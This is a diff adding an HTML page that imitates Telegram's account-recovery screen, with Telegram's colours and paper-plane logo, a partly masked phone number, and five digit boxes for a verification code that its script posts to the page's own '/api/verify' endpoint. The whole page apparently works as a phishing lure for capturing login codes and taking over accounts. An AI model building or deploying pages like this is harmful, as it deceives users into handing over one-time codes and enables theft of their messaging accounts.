@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>RECOVER YOUR ACCOUNT</title>
+<style>
+  :root {
+    --tg-blue: #2AABEE;
+    --tg-blue-dark: #229ED9;
+    --bg: #17212b;
+    --card-bg: #1e2731;
+    --text: #ffffff;
+    --muted: #7d8b99;
+    --error: #ff5c5c;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background: linear-gradient(160deg, #0e1621, #17212b 60%, #1c2b3a);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--text);
+    padding: 24px;
+  }
+
+  .card {
+    background: var(--card-bg);
+    border-radius: 20px;
+    padding: 40px 32px;
+    width: 100%;
+    max-width: 360px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+  }
+
+  .icon {
+    width: 72px;
+    height: 72px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--tg-blue), var(--tg-blue-dark));
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 20px;
+  }
+
+  .icon svg { width: 36px; height: 36px; fill: #fff; }
+
+  h1 {
+    font-size: 20px;
+    margin: 0 0 8px;
+    font-weight: 600;
+  }
+
+  p.subtitle {
+    color: var(--muted);
+    font-size: 14px;
+    margin: 0 0 28px;
+    line-height: 1.4;
+  }
+
+  .digits {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 24px;
+  }
+
+  .digit {
+    width: 48px;
+    height: 56px;
+    border-radius: 12px;
+    border: 2px solid #2b3947;
+    background: #0e1621;
+    color: var(--text);
+    font-size: 24px;
+    text-align: center;
+    outline: none;
+    transition: border-color 0.15s ease;
+  }
+
+  .digit:focus {
+    border-color: var(--tg-blue);
+  }
+
+  .digit.filled {
+    border-color: var(--tg-blue-dark);
+  }
+
+  button#submitBtn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    background: var(--tg-blue);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.15s ease, opacity 0.15s ease;
+  }
+
+  button#submitBtn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+
+  button#submitBtn:not(:disabled):hover {
+    background: var(--tg-blue-dark);
+  }
+
+  .status {
+    margin-top: 16px;
+    font-size: 14px;
+    min-height: 20px;
+  }
+
+  .status.error { color: var(--error); }
+  .status.success { color: #FF0000; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="icon">
+    <svg viewBox="0 0 240 240"><path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0Zm54.6 82.2-19.9 93.8c-1.5 6.7-5.5 8.3-11 5.2l-30.4-22.4-14.7 14.1c-1.6 1.6-3 3-6.1 3l2.2-30.9 56.3-50.9c2.5-2.2-.5-3.4-3.7-1.2L88.1 138l-30.2-9.4c-6.6-2-6.7-6.6 1.4-9.7l117.9-45.4c5.4-2 10.2 1.3 8.4 9.7Z"/></svg>
+  </div>
+  <h1>Recover Your Account</h1>
+  <p class="subtitle">We’ve sent a verification code to +639*****9459.<br>Please enter the code to continue.</p>
+
+  <div class="digits" id="digits">
+    <input class="digit" inputmode="numeric" maxlength="1" data-index="0" autocomplete="off" />
+    <input class="digit" inputmode="numeric" maxlength="1" data-index="1" autocomplete="off" />
+    <input class="digit" inputmode="numeric" maxlength="1" data-index="2" autocomplete="off" />
+    <input class="digit" inputmode="numeric" maxlength="1" data-index="3" autocomplete="off" />
+    <input class="digit" inputmode="numeric" maxlength="1" data-index="4" autocomplete="off" />
+  </div>
+
+  <button id="submitBtn" disabled>Continue</button>
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+  const inputs = Array.from(document.querySelectorAll('.digit'));
+  const submitBtn = document.getElementById('submitBtn');
+  const statusEl = document.getElementById('status');
+
+  function getCode() {
+    return inputs.map(i => i.value).join('');
+  }
+
+  function updateButtonState() {
+    const code = getCode();
+    submitBtn.disabled = !/^\d{5}$/.test(code);
+  }
+
+  inputs.forEach((input, idx) => {
+    input.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 1);
+      if (e.target.value) {
+        e.target.classList.add('filled');
+        if (idx < inputs.length - 1) inputs[idx + 1].focus();
+      } else {
+        e.target.classList.remove('filled');
+      }
+      updateButtonState();
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !input.value && idx > 0) {
+        inputs[idx - 1].focus();
+      }
+    });
+
+    input.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const pasted = (e.clipboardData.getData('text') || '').replace(/[^0-9]/g, '').slice(0, 5);
+      pasted.split('').forEach((digit, i) => {
+        if (inputs[i]) {
+          inputs[i].value = digit;
+          inputs[i].classList.add('filled');
+        }
+      });
+      const nextEmpty = inputs.findIndex(i => !i.value);
+      (nextEmpty === -1 ? inputs[inputs.length - 1] : inputs[nextEmpty]).focus();
+      updateButtonState();
+    });
+  });
+
+  submitBtn.addEventListener('click', async () => {
+    const code = getCode();
+    submitBtn.disabled = true;
+    statusEl.textContent = 'Verifying...';
+    statusEl.className = 'status';
+
+    try {
+      const res = await fetch('/api/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code }),
+      });
+      const data = await res.json();
+
+      if (data.ok) {
+        statusEl.textContent = data.message;
+        statusEl.className = 'status success';
+      } else {
+        statusEl.textContent = data.message;
+        statusEl.className = 'status error';
+        submitBtn.disabled = false;
+      }
+    } catch (err) {
+      statusEl.textContent = 'Something went wrong. Try again.';
+      statusEl.className = 'status error';
+      submitBtn.disabled = false;
+    }
+  });
+
+  inputs[0].focus();
+</script>
+
+</body>
+</html>
